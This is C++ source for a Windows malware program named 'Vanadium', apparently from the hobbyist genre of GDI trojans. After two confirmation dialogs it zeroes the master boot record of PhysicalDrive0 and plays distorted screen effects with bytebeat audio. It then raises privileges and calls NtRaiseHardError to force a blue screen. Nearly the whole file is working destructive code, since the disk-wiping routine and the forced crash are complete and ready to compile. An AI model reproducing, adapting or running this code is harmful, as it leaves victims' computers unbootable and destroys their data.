#include <windows.h>
#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#include <intrin.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib,"Msimg32.lib")
#include "virtual_screen.h"
#include "payloads.h"
#include "timer.h"
#include "def.h"

//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);


DWORD xs;

void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}

void mbr(){
	char mbrData[512];
	ZeroMemory(&mbrData, (sizeof mbrData));
	HANDLE MBR = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
	DWORD write;
	WriteFile(MBR, mbrData, 512, &write, NULL);
	CloseHandle(MBR);
}
/*void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}*/
void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}
void Shader1(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
	}
}

void Shader2(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 50) % 256, ((r + g + b) / 4 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 10;
	}
}
void Shader3(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int randPixel = Xorshift32() % w;
		int tempB = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB(GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb), GetBValue(prgbScreen[randPixel].rgb));
		prgbScreen[randPixel].rgb = RGB(tempB, tempB, tempB);
	}
}
void Shader4(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		int r = GetRValue(prgbScreen[i].rgb);
		int g = GetGValue(prgbScreen[i].rgb);
		int b = GetBValue(prgbScreen[i].rgb);
		prgbScreen[i].rgb = RGB((r + 200) % 256, ((r + g + b) / 10 + t) % 256, ((r + g + b) / 4 + i) % 256) % (RGB(255, 255, 255)) + t * 20;
	}
}
void Shader5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb * 10) % (RGB(255, 255, 255));
	}
}
void Shader6(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
		prgbScreen[i].rgb = (prgbScreen[i].rgb % 0x100) * 0x010101;
	}
}
VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t<<t|t>>t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t >> 10) & 42) * t;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>(t&4096?t*t>>12:t>>12)))|t<<(t>>8)|t>>4;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t<<1)^((t<<1)+(t>>7)&t>>12))|t>>(4-(1^7&(t>>19)))|t>>7;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t<<1)^((t<<1)+(t>>7)&t>>6))|t>>(4-(1^7&(t>>19)))|t>>7;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound6() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t>>t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int main(){
	    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Vanadium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Vanadium", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	mbr();

        	CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(InitTimer), (PVOID)1000, 0, NULL);
			//ExecutePayload(Payload1, PAYLOAD_TIME);
			sound1();
			ExecuteShader(Shader1, PAYLOAD_TIME);
			Sleep(100);
			sound2();
			ExecuteShader(Shader2, PAYLOAD_TIME);
			Sleep(100);
			sound3();
			ExecuteShader(Shader3, PAYLOAD_TIME);
			Sleep(100);
			sound4();
			ExecuteShader(Shader4, PAYLOAD_TIME);
			Sleep(100);
			sound5();
			ExecuteShader(Shader5, PAYLOAD_TIME);
			Sleep(100);
			sound6();
			ExecuteShader(Shader6, PAYLOAD_TIME);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(0xC0000160, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}

